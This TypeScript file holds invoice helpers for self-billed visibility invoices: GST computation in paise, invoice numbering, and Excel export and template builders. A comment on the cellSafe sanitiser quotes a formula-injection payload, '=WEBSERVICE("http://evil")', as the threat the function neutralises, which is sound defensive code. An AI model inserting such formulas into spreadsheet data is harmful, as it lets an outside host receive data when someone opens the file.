/**
 * Invoice helpers — pure logic for self-bill visibility invoices (P6.7).
 *
 * Self-billing arrangement: the retailer (outlet) renders visibility services;
 * Gifsy generates the invoice on the retailer's behalf. The bill recipient is
 * Tech Gifsy Solutions Limited (WB, state code 19).
 *
 * TDS is OUT OF SCOPE here (deferred to P6.5). Do NOT compute TDS.
 *
 * GST rule (#15) — paise-based:
 *   - Only REGULAR GST-registered retailers attract GST.
 *   - Intra/inter determination uses retailer GSTIN first 2 digits vs '19' (WB).
 *   - Equal → CGST 9% + SGST 9% (gstType = CGST_SGST)
 *   - Different → IGST 18%          (gstType = IGST)
 *   - Not REGULAR (or no GSTIN)    → no GST (gstType = null, gstPaise = 0)
 *   - Base is GST-EXCLUSIVE. total = base + gst.
 *
 * Money: all amounts in integer paise (BigInt).
 */

import * as XLSX from 'xlsx';
import { paiseToRupees } from '../common/money';
import { buildXlsx } from '../common/xlsx';

// ── Recipient constant (the self-bill buyer) ────────────────────────────────

export const TECH_GIFSY = {
  legalName: 'Tech Gifsy Solutions Limited',
  gstin: '19AAACT9811F1Z9',
  pan: 'AAACT9811F',
  stateCode: '19',
  state: 'West Bengal',
  address: '16, India Exchange Place, Kolkata, West Bengal 700001',
  sacCode: '998361',
} as const;

// ── Types ────────────────────────────────────────────────────────────────────

export type GstType = 'CGST_SGST' | 'IGST';

export interface GstResult {
  gstApplicable: boolean;
  gstType: GstType | null;
  /** Combined GST paise (CGST+SGST or IGST). Stored as gstPaise on AutoInvoice. */
  gstPaise: bigint;
  totalPaise: bigint;
}

// ── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Generate invoice number.
 * Format: TGSL-VIS-[OUTLET_CODE]-[YYYYMM]-[SEQ]
 * seq is zero-padded to 3 digits.
 *
 * @param outletCode  Outlet code (uppercased automatically)
 * @param period      "YYYY-MM"
 * @param seq         1-based sequence number per (clientId, period)
 */
export function generateInvoiceNumber(
  outletCode: string,
  period: string,
  seq: number,
): string {
  const yyyymm = period.replace('-', '');
  const seqStr = String(seq).padStart(3, '0');
  return `TGSL-VIS-${outletCode.toUpperCase()}-${yyyymm}-${seqStr}`;
}

/**
 * Format a period string "YYYY-MM" → human label "Month YYYY" (en-IN locale).
 *
 * @example formatPeriodLabel('2025-01') → 'January 2025'
 */
export function formatPeriodLabel(period: string): string {
  const [year, month] = period.split('-');
  const date = new Date(Number(year), Number(month) - 1, 1);
  return date.toLocaleString('en-IN', { month: 'long', year: 'numeric' });
}

/**
 * Build the fixed invoice description for a period.
 *
 * @example buildInvoiceDescription('January 2025') → 'Marketing visibility services — January 2025'
 */
export function buildInvoiceDescription(periodLabel: string): string {
  return `Marketing visibility services — ${periodLabel}`;
}

/**
 * Compute GST on a base paise amount.
 *
 * Determination uses the retailer GSTIN's first 2 digits (state code):
 *   '19' (WB, same as Tech Gifsy) → intra-state (CGST 9% + SGST 9%)
 *   anything else                  → inter-state (IGST 18%)
 *
 * Each component is rounded to the nearest paise before summing.
 *
 * @param basePaise              Pre-GST amount (integer paise)
 * @param gstRegistrationType    From ChannelPartner.gstRegistrationType
 * @param retailerGstin          ChannelPartner.gstNumber (may be null)
 */
export function computeGST(
  basePaise: bigint,
  gstRegistrationType: string | null | undefined,
  retailerGstin: string | null | undefined,
): GstResult {
  // GST only for REGULAR registrants with a GSTIN.
  if (gstRegistrationType !== 'REGULAR' || !retailerGstin) {
    return {
      gstApplicable: false,
      gstType: null,
      gstPaise: 0n,
      totalPaise: basePaise,
    };
  }

  // Intra-state: retailer state code (first 2 digits of GSTIN) === '19' (WB / Tech Gifsy).
  const retailerStateCode = retailerGstin.slice(0, 2);
  const isIntraState = retailerStateCode === TECH_GIFSY.stateCode;

  // Pure-BigInt rounding (round-half-up): (x * rate% + 50) / 100. No float intermediate.
  if (isIntraState) {
    // CGST 9% + SGST 9% = 18% total, each rounded separately (standard GST line rounding).
    const cgstPaise = (basePaise * 9n + 50n) / 100n;
    const sgstPaise = (basePaise * 9n + 50n) / 100n;
    const gstPaise = cgstPaise + sgstPaise;
    return {
      gstApplicable: true,
      gstType: 'CGST_SGST',
      gstPaise,
      totalPaise: basePaise + gstPaise,
    };
  } else {
    // IGST 18%.
    const igstPaise = (basePaise * 18n + 50n) / 100n;
    return {
      gstApplicable: true,
      gstType: 'IGST',
      gstPaise: igstPaise,
      totalPaise: basePaise + igstPaise,
    };
  }
}

// ── Excel round-trip (#44) ────────────────────────────────────────────────────

/**
 * A minimal AutoInvoice projection the export needs. We avoid importing the
 * Prisma type so the helper stays a pure, framework-free unit.
 *
 * Money fields are paise — `bigint` when read straight from Prisma, but `number`
 * after the JSON envelope round-trips. The export accepts either and divides by
 * 100 exactly once at the display edge (via `paiseToRupees`).
 */
export interface InvoiceExportRow {
  invoiceNumber: string;
  invoiceNumberEdited?: boolean;
  outletCode: string;
  period: string;
  invoiceDate: Date | string;
  status: string;
  subtotalPaise: bigint | number;
  gstPaise: bigint | number;
  gstType: GstType | null;
  totalPaise: bigint | number;
  /** Frozen-at-generation snapshot (typed loosely — it is stored as JSON). */
  snapshot?: Record<string, unknown> | null;
}

/**
 * Neutralise spreadsheet formula injection. A cell value that begins with
 * `= + - @` (or a leading tab/CR) is interpreted as a live formula by Excel /
 * Google Sheets — a partner-supplied firm name like `=WEBSERVICE("http://evil")`
 * would execute when finance opens the export. Prefix such values with an
 * apostrophe so they are always treated as text.
 */
function cellSafe(v: string): string {
  return /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
}

/** Safe string read from the (loosely-typed) snapshot blob (partner-supplied). */
function snap(row: InvoiceExportRow, key: string): string {
  const v = row.snapshot?.[key];
  return v == null ? '' : cellSafe(String(v));
}

/**
 * For a CGST_SGST invoice the combined gstPaise splits evenly into CGST + SGST.
 * We halve with integer (BigInt) arithmetic and put any odd-paise remainder on
 * CGST so CGST + SGST === gstPaise exactly (never a rounding leak).
 */
function splitGst(gstPaise: bigint): { cgst: bigint; sgst: bigint } {
  const sgst = gstPaise / 2n; // floor
  const cgst = gstPaise - sgst; // carries the odd paise
  return { cgst, sgst };
}

/** Two-decimal ₹ string from paise (display edge — divide by 100 exactly once). */
function rupeeStr(paise: bigint | number): string {
  return paiseToRupees(paise).toFixed(2);
}

/**
 * Build the invoice export workbook (#44).
 *
 * One "Invoices" detail sheet (one row per invoice, ₹ with GST columns + the
 * CGST/SGST split) plus a "Summary" totals sheet. All money is rendered ₹ at the
 * display edge; the DB/transport values stay integer paise.
 *
 * Columns: S.No · Invoice Number · Outlet Code · Outlet Name · Firm Name · PAN
 *          · State · GSTIN · Period · Invoice Date · Subtotal (₹) · GST Type
 *          · CGST (₹) · SGST (₹) · IGST (₹) · Total GST (₹) · Total (₹) · Status
 */
export function buildInvoiceExportXlsx(
  rows: InvoiceExportRow[],
  periodLabelForFile?: string,
): { buffer: Buffer; filename: string } {
  const detail = rows.map((r, i) => {
    const gstPaise = BigInt(r.gstPaise);
    const isCgstSgst = r.gstType === 'CGST_SGST';
    const { cgst, sgst } = isCgstSgst
      ? splitGst(gstPaise)
      : { cgst: 0n, sgst: 0n };
    const igst = r.gstType === 'IGST' ? gstPaise : 0n;

    const invoiceDate =
      r.invoiceDate instanceof Date
        ? r.invoiceDate.toISOString().slice(0, 10)
        : String(r.invoiceDate ?? '').slice(0, 10);

    return {
      'S.No': i + 1,
      'Invoice Number': r.invoiceNumber,
      'Outlet Code': r.outletCode,
      'Outlet Name': snap(r, 'outletName'),
      'Firm Name': snap(r, 'firmName'),
      PAN: snap(r, 'panNumber'),
      State: snap(r, 'retailerState'),
      GSTIN: snap(r, 'retailerGstin'),
      Period: r.period,
      'Invoice Date': invoiceDate,
      'Subtotal (₹)': rupeeStr(r.subtotalPaise),
      'GST Type': r.gstType ?? 'NONE',
      'CGST (₹)': rupeeStr(cgst),
      'SGST (₹)': rupeeStr(sgst),
      'IGST (₹)': rupeeStr(igst),
      'Total GST (₹)': rupeeStr(gstPaise),
      'Total (₹)': rupeeStr(r.totalPaise),
      Status: r.status,
    };
  });

  // Summary totals — sum in paise (BigInt), convert once for display.
  const totalSubtotal = rows.reduce((s, r) => s + BigInt(r.subtotalPaise), 0n);
  const totalGst = rows.reduce((s, r) => s + BigInt(r.gstPaise), 0n);
  const totalTotal = rows.reduce((s, r) => s + BigInt(r.totalPaise), 0n);

  const summary = [
    { Field: 'Total Invoices', Value: rows.length },
    { Field: 'Total Subtotal (₹)', Value: rupeeStr(totalSubtotal) },
    { Field: 'Total GST (₹)', Value: rupeeStr(totalGst) },
    { Field: 'Total Invoice Value (₹)', Value: rupeeStr(totalTotal) },
  ];

  const buffer = buildXlsx([
    // json_to_sheet needs at least one row to emit headers; fall back to a
    // header-only sheet when the filtered set is empty.
    {
      name: 'Invoices',
      rows: detail.length ? detail : [emptyInvoiceHeaderRow()],
    },
    { name: 'Summary', rows: summary },
  ]);

  const stamp = (periodLabelForFile ?? 'all').replace(/[^A-Za-z0-9-]/g, '');
  const filename = `visibility-invoices-${stamp}-${Date.now()}.xlsx`;
  return { buffer, filename };
}

/** Header-only placeholder row so an empty export still ships labelled columns. */
function emptyInvoiceHeaderRow(): Record<string, string> {
  return {
    'S.No': '',
    'Invoice Number': '',
    'Outlet Code': '',
    'Outlet Name': '',
    'Firm Name': '',
    PAN: '',
    State: '',
    GSTIN: '',
    Period: '',
    'Invoice Date': '',
    'Subtotal (₹)': '',
    'GST Type': '',
    'CGST (₹)': '',
    'SGST (₹)': '',
    'IGST (₹)': '',
    'Total GST (₹)': '',
    'Total (₹)': '',
    Status: '',
  };
}

/**
 * Build the blank upload template for the invoice-upload page (#44 — replaces the
 * dead "Download sample template" link).
 *
 * The upload page drives the per-period generation flow (invoices are sourced
 * from approved visibility payout entries — `CreditPayoutEntry`, the P6 no-compute
 * model — NOT from arbitrary amounts). The template documents the period a run
 * targets plus a reference outlet column so operators see the expected shape.
 *
 * Columns: Period (YYYY-MM) · Outlet Code (optional, reference)
 */
export function buildInvoiceUploadTemplate(): Buffer {
  const wb = XLSX.utils.book_new();
  const ws = XLSX.utils.aoa_to_sheet([
    ['Period (YYYY-MM)', 'Outlet Code (optional)'],
    ['2025-01', ''],
  ]);
  XLSX.utils.book_append_sheet(wb, ws, 'Invoice Periods');
  return XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
}
